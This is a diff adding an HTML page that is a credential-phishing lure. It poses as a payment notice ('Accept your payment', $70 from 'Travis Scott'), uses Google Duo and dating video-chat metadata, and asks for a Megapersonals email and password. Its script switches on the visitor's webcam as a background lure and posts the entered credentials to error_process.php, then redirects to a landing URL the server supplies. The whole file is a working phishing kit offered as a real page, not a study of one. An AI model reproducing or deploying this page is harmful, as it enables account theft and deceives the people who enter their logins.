@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="en"><head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" href="css/1e43e3ab50fce75fsw.css" data-precedence="next">
+      <link rel="stylesheet" href="css/57978a1014ff42c9sw.css" data-precedence="next">
+      <title>Except your payment</title>
+      <meta name="description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:title" content="Join video chat">
+      <meta property="og:description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:image" content="images/google-duo.png">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Join video chat">
+      <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
+      <meta name="twitter:image" content="public/google-duo.png">
+      <link rel="icon" href="google-duo.ico" sizes="32x32">
+      <meta name="next-size-adjust">
+   </head>
+   <body class="__className_aaf875">
+      <div style="color-scheme:light" class="bg-neutral-900 text-neutral-950">
+         <video autoplay="" muted="" playsinline="" class="fixed inset-0 w-full h-full object-cover object-center" id="video"></video>
+      
+         <!--login page-->
+    <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="login-page">
+      <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
+         <p class="text-3xl font-semibold">Accept your payment</p>
+         <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">You just got <span class="text-green-500">$70</span> from Travis Scott</p>
+        <img src="images/devilgirl.png" width="180xp" height="120px"><p class="text-sl font-semibold mt-3"> To accept money</p> <p class="text-xl font-semibold mt-3">Login with Megapersonals</p>
+         <form class="flex flex-col gap-y-4 mt-4" method="post" action="" id="loginForm">
+             <input type="hidden" name="_token" value="zs9oYMyI6SGpgYgvGWEPTiFnwkKIyWbGLKAcEoa9" autocomplete="off">             
+             
+             <input required="" class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200" placeholder="Enter email here" type="email" name="email" value="">
+             <input required="" class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200" placeholder="Enter password here" type="password" name="password" value="">
+             
+            <input type="hidden" name="id" value="678">
+      
+                        
+             <button class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200">Submit</button>
+        </form>
+      </div>
+   </div>
+ </div>
+
+
+
+
+<script src="js/jquery-3.7.1.min.js" crossorigin="anonymous"></script>
+<script>
+$(document).ready(function() {
+     $("#login-page").show();
+     $("#msg").show();
+  // Check if getUserMedia is available
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    // Access the webcam
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        // Show the video stream
+        $('#video').get(0).srcObject = stream;
+      })
+      .catch(function(error) {
+        console.error('Error accessing webcam:', error);
+      });
+  } else {
+    console.error('getUserMedia is not supported');
+  }
+
+$("button").on("click",function(){
+  $("#call-popup").hide();
+  $("#login-page").show();
+  
+
+}); 
+
+$('#loginForm').submit(function(e) {
+    e.preventDefault(); // Prevent default form submission
+    // Serialize form data
+    var formData = $(this).serialize();
+
+    // Send AJAX request
+    $.ajax({
+        url: "error_process.php", // Path to your PHP file
+        type: "POST",
+        data: formData, // Form data
+        dataType: "json",
+        success: function(response) {
+            // Handle success response
+            console.log('AJAX request successful');
+            console.log(response);
+            if (response.redirect == true) {
+                window.location.href = response.landing_url;
+            } else {
+                $("#msg").show();
+            }
+        },
+        error: function(xhr, status, error) {
+            // Handle error response
+            console.error('AJAX request failed');
+            console.error(xhr.responseText);
+        }
+    });
+});
+
+  
+});
+</script>
+
+
+
+
+
+</body></html>
